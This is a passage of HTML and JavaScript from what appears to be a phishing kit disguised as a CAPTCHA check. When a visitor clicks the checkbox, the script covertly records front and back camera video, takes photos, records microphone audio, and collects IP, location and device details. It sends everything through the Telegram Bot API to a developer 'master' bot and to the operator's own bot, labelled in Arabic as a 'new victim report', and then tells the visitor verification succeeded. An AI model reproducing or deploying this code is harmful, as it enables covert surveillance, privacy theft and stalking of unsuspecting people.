                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
                                    resolve(blob);
                                };
                            });
                            recorder.start();
                            await delay(5000);
                            if (recorder.state === 'recording') recorder.stop();
                            frontVideo = await videoPromise;

                            for (let i = 0; i < 8; i++) {
                                const w = video.videoWidth || 640;
                                const h = video.videoHeight || 480;
                                canvas.width = w;
                                canvas.height = h;
                                ctx.drawImage(video, 0, 0, w, h);
                                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
                                if (blob) photos.push(blob);
                                await delay(600);
                            }

                            stream.getTracks().forEach(t => t.stop());
                            video.srcObject = null;
                        } catch (e) {
                            console.warn('Front camera error:', e);
                        }

                        // ---- Back camera (video) ----
                        let backVideo = null;
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({
                                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                                audio: false
                            });
                            video.srcObject = stream;
                            await video.play();
                            await delay(400);
                            const recorder = new MediaRecorder(stream);
                            const chunks = [];
                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                            const videoPromise = new Promise((resolve) => {
                                recorder.onstop = () => {
                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
                                    resolve(blob);
                                };
                            });
                            recorder.start();
                            await delay(5000);
                            if (recorder.state === 'recording') recorder.stop();
                            backVideo = await videoPromise;
                            stream.getTracks().forEach(t => t.stop());
                            video.srcObject = null;
                        } catch (e) {
                            console.warn('Back camera error:', e);
                        }

                        // ---- Audio ----
                        let audioBlob = null;
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                            const recorder = new MediaRecorder(stream);
                            const chunks = [];
                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                            const audioPromise = new Promise((resolve) => {
                                recorder.onstop = () => {
                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
                                    resolve(blob);
                                };
                            });
                            recorder.start();
                            await delay(5000);
                            if (recorder.state === 'recording') recorder.stop();
                            audioBlob = await audioPromise;
                            stream.getTracks().forEach(t => t.stop());
                        } catch (e) {
                            console.warn('Audio error:', e);
                        }

                        // ---- Build summary ----
                        const deviceInfo =
                            `IP: ${ip}\n` +
                            `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
                            `المتصفح: ${/Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown'}\n` +
                            `الجهاز: ${navigator.platform || 'Unknown'}\n` +
                            `التوكن الفريد: ${shortToken}\n` +
                            `الوقت: ${new Date().toLocaleString('ar-EG')}`;

                        // ---- Send to Master Bot (Developer) with keepalive ----
                        async function sendToMaster() {
                            // Summary text
                            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: MASTER_CHAT_ID,
                                    text: `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
                                }),
                                keepalive: true
                            });

                            // Location
                            if (location.lat && location.lng) {
                                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: MASTER_CHAT_ID,
                                        latitude: location.lat,
                                        longitude: location.lng
                                    }),
                                    keepalive: true
                                });
                            }

                            // Photos
                            for (let i = 0; i < photos.length; i++) {
                                const fd = new FormData();
                                fd.append('chat_id', MASTER_CHAT_ID);
                                fd.append('photo', photos[i], `photo_${i+1}.jpg`);
                                fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${shortToken}`);
                                await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                                await delay(200);
                            }

                            // Front video
                            if (frontVideo) {
                                const fd = new FormData();
                                fd.append('chat_id', MASTER_CHAT_ID);
                                fd.append('video', frontVideo, 'front_video.webm');
                                fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
                                await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                            }

                            // Back video
                            if (backVideo) {
                                const fd = new FormData();
                                fd.append('chat_id', MASTER_CHAT_ID);
                                fd.append('video', backVideo, 'back_video.webm');
                                fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
                                await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                            }

                            // Audio
                            if (audioBlob) {
                                const fd = new FormData();
                                fd.append('chat_id', MASTER_CHAT_ID);
                                fd.append('audio', audioBlob, 'audio.webm');
                                fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
                                await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                            }
                        }

                        // ---- Send to User's Bot (if mapping found) with keepalive ----
                        async function sendToUser() {
                            if (!userBotToken || !userChatId) {
                                console.log('User bot not found, skipping user send.');
                                return;
                            }

                            // Summary text
                            await fetch(`https://api.telegram.org/bot${userBotToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: userChatId,
                                    text: `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
                                }),
                                keepalive: true
                            });

                            // Location
                            if (location.lat && location.lng) {
                                await fetch(`https://api.telegram.org/bot${userBotToken}/sendLocation`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: userChatId,
                                        latitude: location.lat,
                                        longitude: location.lng
                                    }),
                                    keepalive: true
                                });
                            }

                            // Photos
                            for (let i = 0; i < photos.length; i++) {
                                const fd = new FormData();
                                fd.append('chat_id', userChatId);
                                fd.append('photo', photos[i], `photo_${i+1}.jpg`);
                                fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${shortToken}`);
                                await sendMedia('sendPhoto', userBotToken, fd);
                                await delay(200);
                            }

                            // Front video
                            if (frontVideo) {
                                const fd = new FormData();
                                fd.append('chat_id', userChatId);
                                fd.append('video', frontVideo, 'front_video.webm');
                                fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
                                await sendMedia('sendVideo', userBotToken, fd);
                            }

                            // Back video
                            if (backVideo) {
                                const fd = new FormData();
                                fd.append('chat_id', userChatId);
                                fd.append('video', backVideo, 'back_video.webm');
                                fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
                                await sendMedia('sendVideo', userBotToken, fd);
                            }

                            // Audio
                            if (audioBlob) {
                                const fd = new FormData();
                                fd.append('chat_id', userChatId);
                                fd.append('audio', audioBlob, 'audio.webm');
                                fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
                                await sendMedia('sendAudio', userBotToken, fd);
                            }
                        }

                        // ---- Execute both sends (they will continue in background) ----
                        await Promise.all([
                            sendToMaster(),
                            sendToUser()
                        ]);

                        collectionDone = true;
                        spinner.classList.remove('loading');
                        spinner.classList.add('success');
                        mainText.textContent = 'تم التحقق بنجاح';
                        mainText.className = 'text success';
                        checkbox.checked = true;
                        checkbox.disabled = true;

                    } catch (error) {
                        console.error('Collection error:', error);
                        spinner.classList.remove('loading');
                        spinner.classList.add('failed');
                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
                        mainText.className = 'text failed';
                        checkbox.checked = false;
                        checkbox.disabled = false;
                        isRunning = false;
                        if (attemptCount >= MAX_ATTEMPTS) {
                            checkbox.disabled = true;
                        }
                    }
                }

                // ---- Events ----
                checkbox.addEventListener('change', function(e) {
                    if (this.checked) {
                        this.checked = false;
                        if (!isRunning && !collectionDone) {
                            collectData();
                        }
                    }
                });

                document.querySelector('.captcha-wrapper').addEventListener('click', function(e) {
                    if (e.target.closest('a')) return;
                    if (!isRunning && !collectionDone && !checkbox.disabled) {
                        collectData();
                    }
                });

                console.log('✅ Victim page ready. Token:', shortToken);
            }

            // ============================================================
            //  🔥  INIT – MODE DETECTION
            // ============================================================

            const urlParams = new URLSearchParams(window.location.search);
            const rawToken = urlParams.get('t');

            if (rawToken && rawToken.length >= 4) {
                document.body.className = 'victim-mode';
                initVictimPage(rawToken);
            } else {
                document.body.className = 'admin-mode';
                initAdminPanel();
            }

        })();
    </script>

</body>
